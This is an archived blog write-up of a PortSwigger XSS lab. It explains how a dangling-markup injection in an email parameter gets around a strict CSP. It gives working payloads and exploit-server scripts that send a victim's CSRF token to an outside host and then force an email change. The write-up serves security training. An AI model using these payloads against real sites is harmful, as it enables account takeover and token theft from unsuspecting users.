# Reflected XSS protected by very strict CSP, with dangling markup attack (Port Swigger XSS Lab)

- **Source URL:** https://medium.com/@hackllego/reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack-port-swigger-xss-lab-e8811c2e476d?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250116111019/https://medium.com/@hackllego/reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack-port-swigger-xss-lab-e8811c2e476d?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/8480 (id 8480)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Reflected XSS protected by very strict CSP, with dangling markup attack (Port Swigger XSS Lab)

This laboratory has been complicated by not having a correct approach, when in fact it is not as complex as it may seem at first, I proceed with the explanation.

First of all, I notice that the GET parameter “email” alters the value of the email input field on the profile page, which may indicate a possible injection point for XSS. However we are constrained by a rather strict CSP, which among other things prevents us from executing inline scripts.

Next, after some testing, I notice that no characters seem to be escaped or filtered making it possible to use dangling markup techniques. Seeing that the injection point is just before the CSRF token, it occurred to me that I could “copy” the email change form and try to exfiltrate the token. Which I did as follows:

- With the payload:

`"></form><form class="login-form" name="change-email-form" action="https://EXPLOIT-SERVER-ID.exploit-server.net/log" method="GET"><button class="button" type="submit">Click me</button>`
- We can elaborate a small script that we will introduce in the exploitation server:

```
<script>
location = 'https://LAB-ID.web-security-academy.net/my-account?email="></form><form class="login-form" name="change-email-form" action="https://EXPLOIT-SERVER-ID.exploit-server.net/log" method="GET"><button class="button" type="submit">Click me</button>';
</script>
```
We test the exploit and find that it works surprisingly well, both for ourselves and for the victim.

Knowing the above, we are going to modify the payload so that it acts exactly like the email change form, except that we will hide the email input field and manually indicate the email to be used for the unauthorized change.

```
<script>
location = 'https://LAB-ID.web-security-academy.net/my-account?email="></form><form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST"><button class="button" type="submit">Click me</button><input required type="hidden" name="email" value="hackllego@hackllego.hack">';
</script>
```
I save and send the exploit to the victim and the lab is solved, I hope I have been helpful, thanks for reading.
